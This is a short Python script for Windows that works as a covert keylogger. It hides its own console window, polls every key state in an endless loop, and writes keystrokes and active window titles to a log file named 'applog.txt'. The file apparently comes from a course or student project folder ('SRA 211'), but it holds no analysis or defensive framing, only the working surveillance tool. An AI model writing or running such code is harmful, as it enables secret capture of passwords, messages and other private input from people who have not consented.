import ctypes
import logging

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

def getCurrentWindow():

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()
    length = GetWindowTextLength(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)

    GetWindowText(hwnd, buff, length + 1)

    return buff.value

def getKeys(log_dir, log_name):
    logging.basicConfig(filename=(log_dir + "\\" + log_name), level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc',
                    0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = []

    while True:

        if current_window != getCurrentWindow():
            current_window = getCurrentWindow()
            logging.info(str(current_window).encode('utf-8'))

        for i in range(1, 256):
            if GetAsyncKeyState(i) & 1:
                if i in special_keys:
                    logging.info("<{}>".format(special_keys[i]))
                elif i == 0x0d:
                    logging.info(line)
                    line.clear()
                elif 0x30 <= i <= 0x5a:
                    line.append(chr(i))

def main():
    log_directory = r'D:\Documents\SRA 211'
    log_name = 'applog.txt'

    getKeys(log_directory, log_name)

if __name__== '__main__':
        main()